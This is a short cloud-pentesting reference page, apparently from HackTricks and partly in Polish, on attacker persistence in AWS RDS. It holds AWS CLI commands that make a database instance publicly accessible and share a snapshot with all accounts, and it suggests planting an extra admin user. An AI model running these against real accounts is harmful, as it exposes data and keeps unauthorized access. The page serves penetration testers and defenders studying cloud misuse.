# AWS - RDS Persistence

{{#include ../../../banners/hacktricks-training.md}}

## RDS

Aby uzyskać więcej informacji, sprawdź:

{{#ref}}
../aws-services/aws-relational-database-rds-enum.md
{{#endref}}

### Uczyń instancję publicznie dostępną: `rds:ModifyDBInstance`

Atakujący z tym uprawnieniem może **zmodyfikować istniejącą instancję RDS, aby umożliwić publiczną dostępność**.
```bash
aws rds modify-db-instance --db-instance-identifier target-instance --publicly-accessible --apply-immediately
```
### Create an admin user inside the DB

Atakujący mógłby po prostu **utworzyć użytkownika w bazie danych**, więc nawet jeśli hasło głównego użytkownika zostanie zmienione, **nie traci dostępu** do bazy danych.

### Make snapshot public
```bash
aws rds modify-db-snapshot-attribute --db-snapshot-identifier <snapshot-name> --attribute-name restore --values-to-add all
```
{{#include ../../../banners/hacktricks-training.md}}
